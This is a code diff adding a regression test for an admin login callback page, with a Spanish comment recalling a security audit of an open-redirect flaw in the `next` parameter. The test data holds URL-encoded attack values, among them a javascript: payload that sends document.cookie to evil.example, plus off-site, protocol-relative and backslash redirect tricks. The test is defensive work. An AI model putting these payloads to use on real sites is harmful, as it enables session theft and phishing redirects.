@@ -130,6 +130,22 @@ describe('AdminAuthCallbackPage', () => {
     expect(window.location.href).toBe('/admin')
   })
 
+  // Auditoría de seguridad 23-09: `next` terminaba tal cual en
+  // `window.location.href`. Con una sesión ya abierta, el INITIAL_SESSION
+  // navegaba al instante: un enlace a leasefy.co corría código del atacante
+  // con la sesión de quien lo abría, o lo mandaba a otro sitio.
+  it.each([
+    ['javascript:', 'next=javascript%3Afetch(%27%2F%2Fevil.example%3Fc%3D%27%2Bdocument.cookie)'],
+    ['un dominio ajeno', 'next=https%3A%2F%2Fevil.example%2Fadmin'],
+    ['protocolo relativo', 'next=%2F%2Fevil.example'],
+    ['barra invertida', 'next=%2F%5Cevil.example'],
+  ])('never navigates to %s taken from `next` (falls back to /admin)', async (_caso, search) => {
+    state.search = search
+    await mount()
+    await emit('INITIAL_SESSION', SESSION)
+    expect(window.location.href).toBe('/admin')
+  })
+
   it('shows an error (and does not navigate) when the implicit hash carries an error', async () => {
     setLocation('#error=access_denied&error_description=Email+link+is+invalid+or+has+expired')
     await mount()
